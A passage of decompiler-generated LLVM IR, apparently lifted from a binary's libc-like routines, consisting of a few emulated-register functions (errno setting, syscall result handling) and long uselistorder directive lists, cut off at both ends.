112, 270, 271, 272, 286, 151, 287, 54, 33, 288, 289, 34, 290, 64, 73, 113, 291, 292, 467, 279, 70, 69, 68, 280, 114, 35, 36, 37, 38, 39, 281, 66, 65, 282, 67, 115, 283, 284, 285, 152, 293, 116, 294, 303, 304, 153, 305, 306, 307, 154, 155, 1, 117, 308, 82, 309, 310, 311, 156, 312, 313, 157, 158, 2, 118, 314, 83, 315, 84, 316, 317, 318, 319, 159, 320, 321, 160, 161, 322, 323, 119, 324, 3, 325, 85, 326, 120, 327, 328, 329, 330, 162, 331, 332, 163, 164, 333, 334, 121, 335, 4, 336, 86, 337, 122, 338, 40, 348, 349, 350, 165, 351, 352, 353, 354, 166, 167, 123, 355, 124, 357, 87, 358, 359, 360, 168, 361, 362, 169, 170, 363, 88, 364, 89, 365, 366, 367, 368, 171, 369, 370, 172, 173, 126, 371, 125, 372, 90, 373, 91, 374, 375, 376, 377, 378, 379, 128, 380, 129, 381, 174, 382, 59, 383, 175, 176, 130, 384, 127, 385, 92, 386, 93, 387, 388, 389, 177, 390, 391, 178, 179, 392, 131, 393, 94, 394, 180, 181, 182, 395, 396, 132, 95, 183, 184, 185, 468, 469, 133, 96, 186, 41, 409, 187, 42, 410, 188, 43, 411, 189, 44, 412, 190, 45, 413, 191, 74, 46, 414, 415, 192, 47, 416, 193, 48, 417, 194, 49, 418, 195, 50, 419, 196, 51, 420, 470, 339, 340, 341, 342, 343, 344, 345, 197, 346, 356 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 2, 35, 36, 24, 25, 26, 27, 28, 29, 30, 31, 34, 3, 37, 38, 39, 4, 40, 41, 42, 18, 43, 44, 5, 45, 46, 47, 48, 49, 50, 6, 51, 52, 53, 54, 55, 56, 32, 33, 314, 315, 203, 204, 277, 278, 23, 316, 317, 318, 323, 324, 7, 57, 58, 111, 8, 112, 113, 114, 0, 115, 116, 279, 280, 281, 282, 283, 284, 285, 286, 287, 260, 261, 262, 263, 264, 265, 288, 289, 290, 291, 292, 293, 294, 295, 9, 296, 297, 298, 299, 300, 301, 302, 64, 65, 117, 118, 66, 67, 303, 304, 305, 306, 128, 129, 130, 131, 132, 137, 138, 139, 140, 141, 133, 134, 135, 136, 142, 143, 144, 145, 146, 147, 250, 251, 321, 322, 68, 69, 70, 71, 183, 184, 319, 320, 211, 212, 148, 149, 205, 206, 119, 120, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 307, 308, 20, 309, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 60, 61, 59, 62, 63, 85, 86, 87, 88, 89, 90, 91, 96, 97, 10, 98, 99, 100, 101, 102, 103, 104, 105, 106, 213, 214, 215, 216, 92, 93, 94, 95, 107, 108, 109, 110, 121, 11, 122, 123, 124, 125, 126, 127, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 21, 178, 179, 180, 181, 182, 185, 22, 186, 187, 188, 189, 190, 217, 218, 219, 220, 221, 222, 223, 224, 12, 225, 226, 227, 228, 229, 230, 231, 232, 233, 1, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 252, 13, 253, 254, 255, 15, 14, 256, 257, 258, 259, 17, 16, 310, 311, 312, 313, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 193, 191, 192, 19, 194, 195, 196, 197, 198, 199, 200, 201, 202, 207, 208, 209, 210 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_16510, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1650c, { 1, 0 }
  uselistorder label %dec_label_pc_164fc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16488, { 1, 0 }
}

define i32 @function_1651c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1651c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1651c = load i32, i32* @r4, align 4
  store i32 %v3_1651c, i32* %stack_var_-8, align 4
  %v1_16520 = add i32 %arg1, 8
  %v1_16524 = inttoptr i32 %v1_16520 to i32*
  %v2_16524 = load i32, i32* %v1_16524, align 4
  %v3_16524 = add i32 %arg1, 12
  %v4_16524 = inttoptr i32 %v3_16524 to i32*
  %v5_16524 = load i32, i32* %v4_16524, align 4
  %v2_16528 = sub i32 %v5_16524, %v2_16524
  store i32 %v2_16528, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16530 = inttoptr i32 %arg1 to i16*
  %v4_16530 = call i32 @function_16410(i16* %v3_16530, i32 %v2_16524, i32 %v2_16528)
  %v0_16534 = load i32, i32* @r4, align 4
  %v1_16534 = add i32 %v0_16534, 8
  %v2_16534 = inttoptr i32 %v1_16534 to i32*
  %v3_16534 = load i32, i32* %v2_16534, align 4
  store i32 %v3_16534, i32* %r2.global-to-local, align 4
  %v2_16538 = add i32 %v3_16534, %v4_16530
  %v2_1653c = add i32 %v0_16534, 20
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  store i32 %v2_16538, i32* %v3_1653c, align 4
  %v0_16540 = load i32, i32* %r2.global-to-local, align 4
  %v1_16540 = load i32, i32* @r4, align 4
  %v2_16540 = add i32 %v1_16540, 16
  %v3_16540 = inttoptr i32 %v2_16540 to i32*
  store i32 %v0_16540, i32* %v3_16540, align 4
  %v2_16544 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16544, i32* @r4, align 4
  ret i32 %v4_16530

; uselistorder directives
  uselistorder i32 %v4_16530, { 1, 0 }
  uselistorder i32 20, { 30, 113, 3, 114, 115, 1, 116, 31, 7, 32, 33, 34, 35, 29, 44, 45, 25, 26, 27, 28, 117, 8, 118, 108, 109, 110, 2, 46, 9, 47, 48, 0, 36, 38, 4, 40, 10, 41, 24, 39, 37, 42, 43, 49, 50, 11, 51, 52, 53, 54, 55, 56, 57, 58, 12, 59, 60, 61, 62, 63, 64, 13, 65, 66, 14, 67, 68, 69, 70, 15, 71, 72, 16, 73, 74, 75, 76, 78, 17, 79, 80, 81, 82, 83, 84, 18, 85, 86, 87, 88, 19, 20, 89, 5, 90, 21, 91, 92, 93, 94, 6, 95, 22, 96, 97, 98, 99, 100, 23, 101, 102, 103, 104, 105, 106, 107, 111, 112, 77 }
  uselistorder i32 12, { 10, 11, 38, 12, 13, 41, 7, 167, 168, 169, 170, 171, 173, 174, 172, 175, 176, 177, 178, 179, 180, 181, 14, 15, 16, 17, 19, 18, 20, 42, 43, 21, 44, 45, 46, 47, 48, 39, 40, 83, 84, 35, 36, 37, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 3, 121, 122, 123, 124, 125, 22, 126, 144, 23, 24, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 163, 156, 157, 158, 159, 160, 161, 162, 164, 165, 25, 166, 4, 85, 86, 26, 87, 88, 27, 64, 49, 59, 60, 61, 65, 66, 62, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 67, 68, 69, 6, 70, 71, 72, 73, 75, 76, 34, 77, 28, 78, 29, 79, 30, 80, 82, 81, 74, 5, 118, 89, 90, 31, 91, 92, 93, 32, 94, 95, 96, 97, 98, 99, 8, 100, 101, 102, 103, 104, 105, 9, 106, 107, 33, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 119, 120, 0, 1, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1654c() local_unnamed_addr {
dec_label_pc_1654c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1654c = load i32, i32* @r4, align 4
  store i32 %v3_1654c, i32* %stack_var_-12, align 4
  %v0_16550 = load i32, i32* @r0, align 4
  %v1_16550 = inttoptr i32 %v0_16550 to i16*
  %v2_16550 = load i16, i16* %v1_16550, align 2
  %v3_16550 = zext i16 %v2_16550 to i32
  store i32 %v3_16550, i32* %r3.global-to-local, align 4
  %v0_16554 = load i32, i32* @r1, align 4
  %v2_16554 = and i32 %v0_16554, %v3_16550
  %v4_16554 = icmp eq i32 %v2_16554, 0
  store i32 %v0_16550, i32* @r4, align 4
  br i1 %v4_16554, label %dec_label_pc_16564, label %dec_label_pc_16574

dec_label_pc_16564:                               ; preds = %dec_label_pc_1654c
  %v1_16564 = and i32 %v3_16550, 2176
  %v2_16564 = icmp eq i32 %v1_16564, 0
  br i1 %v2_16564, label %dec_label_pc_1656c, label %dec_label_pc_16580

dec_label_pc_1656c:                               ; preds = %dec_label_pc_16564
  %v2_1656c = or i32 %v0_16554, %v3_16550
  store i32 %v2_1656c, i32* %r3.global-to-local, align 4
  %v1_16570 = trunc i32 %v2_1656c to i16
  store i16 %v1_16570, i16* %v1_16550, align 2
  %v0_16574.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_1654c, %dec_label_pc_1656c
  %v0_16574 = phi i32 [ %v0_16550, %dec_label_pc_1654c ], [ %v0_16574.pre, %dec_label_pc_1656c ]
  %v1_16574 = inttoptr i32 %v0_16574 to i16*
  %v2_16574 = load i16, i16* %v1_16574, align 2
  %v3_16574 = zext i16 %v2_16574 to i32
  store i32 %v3_16574, i32* %r3.global-to-local, align 4
  %v1_16578 = and i32 %v3_16574, 16
  store i32 %v1_16578, i32* %r5.global-to-local, align 4
  %v2_16578 = icmp eq i32 %v1_16578, 0
  br i1 %v2_16578, label %dec_label_pc_165a0, label %dec_label_pc_16580

dec_label_pc_16580:                               ; preds = %dec_label_pc_16564, %dec_label_pc_16574
  %v0_16580 = call i32 @function_11734()
  store i32 %v0_16580, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_16588 = inttoptr i32 %v0_16580 to i32*
  store i32 9, i32* %v2_16588, align 4
  br label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_165a8, %dec_label_pc_16580
  %v0_1658c = load i32, i32* @r4, align 4
  %v1_1658c = inttoptr i32 %v0_1658c to i16*
  %v2_1658c = load i16, i16* %v1_1658c, align 2
  %v3_1658c = zext i16 %v2_1658c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16594 = or i32 %v3_1658c, 8
  store i32 %v1_16594, i32* %r3.global-to-local, align 4
  %v1_16598 = trunc i32 %v1_16594 to i16
  store i16 %v1_16598, i16* %v1_1658c, align 2
  %v1_165e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165d8

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16574
  %v1_165a0 = and i32 %v3_16574, 64
  %v2_165a0 = icmp eq i32 %v1_165a0, 0
  br i1 %v2_165a0, label %dec_label_pc_165c8, label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_165a0
  %v0_165a8 = load i32, i32* @r0, align 4
  %v1_165a8 = call i32 @function_1517c(i32 %v0_165a8)
  store i32 %v1_165a8, i32* %r0.global-to-local, align 4
  %v2_165ac = icmp eq i32 %v1_165a8, 0
  br i1 %v2_165ac, label %dec_label_pc_165b4, label %dec_label_pc_1658c

dec_label_pc_165b4:                               ; preds = %dec_label_pc_165a8
  %v0_165b4 = load i32, i32* @r4, align 4
  %v1_165b4 = inttoptr i32 %v0_165b4 to i16*
  %v2_165b4 = load i16, i16* %v1_165b4, align 2
  %v3_165b4 = zext i16 %v2_165b4 to i32
  store i32 %v3_165b4, i32* %r3.global-to-local, align 4
  %v1_165b8 = add i32 %v0_165b4, 8
  %v2_165b8 = inttoptr i32 %v1_165b8 to i32*
  %v3_165b8 = load i32, i32* %v2_165b8, align 4
  %v1_165bc = and i32 %v3_165b4, 65471
  store i32 %v1_165bc, i32* %r3.global-to-local, align 4
  %v2_165c0 = add i32 %v0_165b4, 28
  %v3_165c0 = inttoptr i32 %v2_165c0 to i32*
  store i32 %v3_165b8, i32* %v3_165c0, align 4
  %v0_165c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_165c4 = trunc i32 %v0_165c4 to i16
  %v2_165c4 = load i32, i32* @r4, align 4
  %v3_165c4 = inttoptr i32 %v2_165c4 to i16*
  store i16 %v1_165c4, i16* %v3_165c4, align 2
  %v0_165c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_165c8

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165a0, %dec_label_pc_165b4
  %v2_165d0 = phi i32 [ %v0_16574, %dec_label_pc_165a0 ], [ %v0_165c8.pre, %dec_label_pc_165b4 ]
  %v1_165c8 = inttoptr i32 %v2_165d0 to i16*
  %v2_165c8 = load i16, i16* %v1_165c8, align 2
  %v3_165c8 = zext i16 %v2_165c8 to i32
  %v1_165cc = or i32 %v3_165c8, 1
  store i32 %v1_165cc, i32* %r3.global-to-local, align 4
  %v1_165d0 = trunc i32 %v1_165cc to i16
  store i16 %v1_165d0, i16* %v1_165c8, align 2
  %v0_165d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_165d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %dec_label_pc_1658c, %dec_label_pc_165c8
  %v1_165e0 = phi i32 [ %v1_165e0.pre, %dec_label_pc_1658c ], [ %v0_165d4, %dec_label_pc_165c8 ]
  %v2_165dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_165dc, i32* @r4, align 4
  ret i32 %v1_165e0

; uselistorder directives
  uselistorder i32 %v3_16550, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 22, 47, 7, 23, 24, 25, 35, 36, 20, 10, 21, 11, 12, 13, 14, 44, 45, 46, 8, 15, 0, 26, 1, 27, 2, 28, 3, 29, 4, 30, 5, 31, 6, 32, 9, 19, 34, 33, 16, 17, 18, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1517c, { 2, 1, 0 }
  uselistorder i32 64, { 13, 14, 15, 16, 20, 9, 10, 11, 12, 52, 17, 18, 19, 21, 22, 6, 23, 24, 25, 0, 26, 27, 28, 1, 29, 30, 31, 2, 32, 33, 34, 7, 35, 36, 37, 3, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 47, 5, 48, 49, 50, 8, 51 }
  uselistorder i32 8, { 71, 72, 73, 74, 75, 76, 77, 64, 65, 66, 67, 142, 78, 223, 34, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 79, 80, 81, 82, 83, 84, 85, 28, 86, 87, 88, 89, 90, 91, 92, 93, 94, 68, 69, 70, 113, 114, 115, 45, 241, 242, 29, 174, 175, 176, 177, 178, 179, 180, 181, 7, 56, 182, 183, 184, 185, 186, 187, 188, 189, 8, 161, 162, 163, 164, 165, 166, 167, 168, 190, 191, 192, 193, 194, 9, 195, 196, 10, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 214, 207, 208, 209, 210, 57, 23, 211, 212, 213, 58, 59, 11, 215, 216, 217, 218, 220, 221, 60, 12, 222, 13, 219, 37, 38, 35, 36, 25, 26, 31, 32, 39, 243, 116, 117, 118, 119, 46, 62, 30, 14, 15, 22, 16, 40, 99, 100, 17, 18, 19, 101, 47, 95, 48, 96, 49, 97, 50, 98, 63, 33, 102, 103, 104, 24, 27, 106, 20, 51, 107, 52, 108, 109, 105, 110, 111, 53, 112, 120, 121, 122, 3, 123, 124, 125, 4, 126, 127, 128, 129, 130, 131, 132, 5, 133, 134, 135, 136, 137, 138, 139, 6, 143, 41, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 169, 42, 170, 43, 171, 44, 172, 54, 173, 0, 1, 61, 21, 140, 55, 141, 2 }
  uselistorder i32 9, { 5, 26, 21, 22, 59, 61, 6, 43, 4, 44, 7, 32, 23, 28, 9, 27, 8, 10, 29, 11, 30, 12, 31, 33, 2, 24, 25, 34, 13, 35, 14, 36, 15, 37, 38, 39, 16, 40, 41, 17, 42, 0, 18, 1, 57, 45, 46, 47, 48, 49, 50, 19, 51, 52, 53, 54, 55, 56, 58, 3, 60, 20 }
  uselistorder i32 16, { 108, 109, 110, 102, 103, 104, 105, 111, 33, 34, 35, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 112, 113, 114, 115, 116, 2, 1, 25, 48, 49, 50, 51, 119, 52, 120, 117, 118, 53, 54, 121, 9, 55, 56, 122, 123, 57, 58, 124, 125, 106, 107, 59, 147, 148, 98, 99, 100, 101, 60, 26, 140, 36, 61, 62, 63, 229, 230, 231, 232, 64, 233, 3, 65, 234, 235, 0, 236, 237, 66, 24, 149, 67, 150, 68, 69, 10, 23, 11, 12, 4, 13, 14, 70, 128, 37, 129, 130, 71, 126, 131, 127, 134, 135, 38, 97, 136, 72, 73, 15, 92, 16, 17, 74, 132, 133, 75, 138, 139, 39, 137, 40, 76, 77, 141, 78, 142, 79, 143, 80, 144, 81, 145, 82, 146, 41, 222, 151, 152, 27, 153, 154, 18, 155, 156, 5, 83, 157, 158, 159, 28, 160, 161, 162, 163, 164, 6, 84, 165, 29, 166, 167, 168, 19, 169, 170, 93, 20, 94, 171, 85, 86, 172, 173, 7, 43, 174, 42, 175, 30, 176, 177, 178, 21, 179, 180, 95, 22, 96, 181, 87, 88, 182, 183, 8, 45, 184, 44, 185, 89, 187, 188, 189, 190, 31, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 205, 204, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 218, 220, 221, 223, 224, 32, 225, 226, 227, 228, 90, 46, 238, 91, 47, 186 }
  uselistorder i32* @r1, { 16, 15, 60, 17, 18, 19, 20, 1, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 2, 97, 98, 21, 22, 23, 24, 0, 46, 47, 12, 25, 39, 40, 41, 3, 75, 73, 74, 4, 76, 5, 30, 31, 10, 61, 62, 63, 7, 26, 48, 11, 77, 78, 49, 8, 79, 50, 51, 32, 27, 28, 29, 34, 33, 38, 64, 35, 36, 37, 42, 43, 44, 45, 52, 53, 54, 9, 55, 70, 71, 6, 56, 57, 58, 59, 65, 66, 67, 68, 69, 72, 14, 13 }
  uselistorder label %dec_label_pc_165d8, { 1, 0 }
  uselistorder label %dec_label_pc_165c8, { 1, 0 }
  uselistorder label %dec_label_pc_16580, { 1, 0 }
  uselistorder label %dec_label_pc_16574, { 1, 0 }
}

define i32 @function_165e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_165e4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_165e4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_165f4 = call i32 @function_11840()
  %v0_165f8 = load i32, i32* @r5, align 4
  %v1_165f8 = load i32, i32* @r4, align 4
  %v2_165f8 = add i32 %v1_165f8, %v0_165f8
  store i32 %v6_165e4, i32* @r5, align 4
  ret i32 %v2_165f8

; uselistorder directives
  uselistorder i32 ()* @function_11840, { 6, 7, 5, 0, 2, 1, 4, 3 }
  uselistorder i32* @r5, { 41, 42, 43, 44, 27, 28, 29, 30, 31, 32, 33, 34, 35, 45, 5, 46, 47, 48, 680, 681, 682, 49, 23, 50, 0, 51, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 19, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 25, 26, 74, 75, 76, 77, 78, 79, 6, 80, 81, 82, 83, 84, 85, 86, 7, 87, 88, 89, 10, 90, 91, 8, 92, 93, 94, 95, 96, 97, 9, 98, 99, 100, 101, 102, 103, 36, 11, 37, 38, 39, 40, 263, 264, 265, 266, 267, 268, 695, 12, 696, 697, 705, 104, 105, 106, 107, 108, 109, 110, 698, 699, 700, 701, 702, 703, 704, 111, 112, 113, 114, 634, 635, 639, 640, 641, 642, 643, 636, 637, 638, 583, 584, 585, 13, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 644, 645, 668, 14, 669, 670, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 3, 659, 660, 661, 662, 663, 15, 664, 665, 666, 667, 132, 133, 134, 135, 136, 269, 270, 16, 271, 272, 273, 274, 275, 24, 115, 276, 17, 277, 278, 279, 280, 281, 282, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 116, 117, 118, 119, 120, 131, 198, 199, 200, 201, 202, 203, 204, 205, 206, 212, 213, 214, 215, 216, 217, 207, 208, 209, 210, 211, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 438, 439, 440, 441, 442, 443, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 1, 232, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 2, 262, 283, 284, 285, 286, 287, 20, 288, 289, 290, 291, 292, 293, 294, 21, 295, 22, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 444, 445, 18, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 4, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 671, 672, 673, 674, 675, 676, 677, 678, 679, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437 }
  uselistorder i32* @r2, { 7, 10, 11, 39, 40, 12, 13, 14, 15, 16, 17, 28, 8, 9, 29, 41, 46, 47, 48, 49, 1, 52, 42, 22, 23, 43, 2, 3, 36, 37, 4, 38, 5, 0, 50, 6, 51, 44, 45, 24, 25, 26, 30, 31, 35, 21, 18, 19, 20, 27, 32, 33, 34 }
}

define i32 @function_16608(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16608:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16648, label %dec_label_pc_16634

dec_label_pc_16634:                               ; preds = %dec_label_pc_16608
  %v0_16634 = call i32 @function_11734()
  %v0_16638 = load i32, i32* %r4.global-to-local, align 4
  %v1_16638 = sub i32 0, %v0_16638
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16640 = inttoptr i32 %v0_16634 to i32*
  store i32 %v1_16638, i32* %v2_16640, align 4
  %v0_16650.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16650

dec_label_pc_16648:                               ; preds = %dec_label_pc_16608
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_16648 = icmp eq i32 %arg1, 0
  br i1 %v2_16648, label %dec_label_pc_1665c, label %dec_label_pc_16650

dec_label_pc_16650:                               ; preds = %dec_label_pc_16648, %dec_label_pc_16634
  %v0_16650 = phi i32 [ %arg1, %dec_label_pc_16648 ], [ %v0_16650.pre, %dec_label_pc_16634 ]
  br label %dec_label_pc_16660

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16648
  br label %dec_label_pc_16660

dec_label_pc_16660:                               ; preds = %dec_label_pc_16650, %dec_label_pc_1665c
  %v1_16668 = phi i32 [ %v0_16650, %dec_label_pc_16650 ], [ %tmp8, %dec_label_pc_1665c ]
  ret i32 %v1_16668

; uselistorder directives
  uselistorder i32 -1, { 264, 270, 181, 265, 266, 267, 127, 268, 128, 269, 97, 98, 99, 100, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 182, 183, 0, 184, 166, 271, 272, 185, 129, 273, 186, 1, 101, 274, 275, 170, 276, 187, 3, 2, 188, 189, 130, 343, 131, 132, 312, 133, 317, 120, 318, 303, 304, 305, 134, 263, 135, 319, 320, 4, 190, 191, 192, 321, 299, 300, 171, 193, 5, 194, 6, 195, 172, 322, 10, 196, 197, 9, 11, 323, 8, 198, 199, 102, 7, 200, 103, 104, 105, 106, 201, 202, 203, 114, 281, 282, 12, 283, 136, 324, 137, 138, 315, 139, 325, 140, 309, 141, 284, 142, 301, 143, 144, 285, 145, 326, 146, 327, 119, 180, 13, 307, 204, 147, 316, 148, 345, 149, 286, 150, 287, 151, 288, 152, 306, 153, 347, 154, 310, 155, 344, 156, 313, 157, 308, 158, 296, 159, 160, 161, 346, 162, 302, 205, 206, 207, 14, 112, 117, 15, 16, 118, 113, 168, 169, 208, 21, 209, 289, 277, 278, 163, 279, 18, 210, 211, 19, 212, 213, 214, 215, 216, 217, 218, 219, 20, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 173, 280, 22, 237, 107, 23, 238, 239, 24, 240, 241, 122, 121, 290, 17, 242, 243, 244, 25, 245, 125, 126, 123, 124, 246, 26, 247, 165, 291, 108, 27, 28, 248, 116, 29, 30, 31, 32, 33, 164, 297, 298, 115, 179, 174, 292, 175, 293, 35, 176, 294, 34, 36, 37, 38, 177, 295, 39, 40, 41, 42, 249, 43, 109, 44, 45, 250, 46, 167, 47, 48, 49, 251, 50, 51, 52, 53, 54, 55, 56, 57, 58, 110, 59, 60, 61, 62, 63, 252, 64, 253, 65, 66, 67, 254, 68, 69, 70, 255, 71, 72, 73, 74, 75, 256, 76, 77, 78, 79, 80, 81, 257, 82, 178, 314, 83, 84, 85, 258, 86, 87, 88, 259, 89, 90, 91, 260, 92, 93, 94, 95, 261, 262, 311, 96, 111 }
  uselistorder i32 ()* @function_11734, { 62, 58, 61, 60, 59, 64, 57, 56, 9, 8, 23, 31, 3, 35, 21, 63, 2, 1, 0, 39, 38, 22, 14, 16, 15, 53, 52, 13, 28, 27, 12, 25, 51, 37, 50, 49, 11, 10, 55, 54, 20, 18, 17, 34, 26, 6, 48, 47, 46, 19, 4, 24, 7, 29, 33, 41, 30, 45, 5, 36, 44, 43, 42, 40, 32 }
  uselistorder i32 1, { 21, 20, 851, 660, 378, 379, 380, 661, 351, 852, 853, 854, 662, 280, 282, 281, 283, 278, 285, 279, 284, 663, 253, 252, 254, 664, 269, 270, 267, 273, 271, 268, 272, 665, 240, 114, 113, 463, 493, 464, 1087, 1088, 1089, 1090, 477, 666, 364, 668, 667, 403, 404, 855, 669, 467, 1187, 468, 856, 1188, 857, 858, 859, 861, 860, 449, 670, 863, 862, 1012, 1013, 1189, 469, 1190, 1191, 1192, 1193, 1194, 1195, 847, 1196, 1197, 1198, 1199, 1200, 1201, 848, 653, 672, 671, 406, 407, 412, 414, 413, 408, 405, 409, 411, 410, 867, 864, 865, 866, 491, 470, 336, 334, 335, 338, 337, 534, 868, 869, 870, 871, 673, 654, 274, 275, 872, 676, 675, 674, 161, 164, 162, 165, 166, 167, 163, 535, 873, 678, 677, 368, 371, 369, 366, 367, 370, 874, 679, 207, 206, 205, 875, 876, 680, 32, 31, 681, 255, 536, 850, 301, 302, 877, 878, 879, 880, 537, 881, 882, 883, 471, 684, 683, 682, 373, 372, 377, 375, 374, 376, 884, 885, 886, 686, 685, 181, 182, 538, 887, 687, 352, 888, 889, 890, 891, 892, 539, 688, 108, 109, 110, 112, 111, 540, 183, 242, 689, 248, 247, 170, 690, 295, 691, 90, 89, 692, 185, 190, 184, 189, 193, 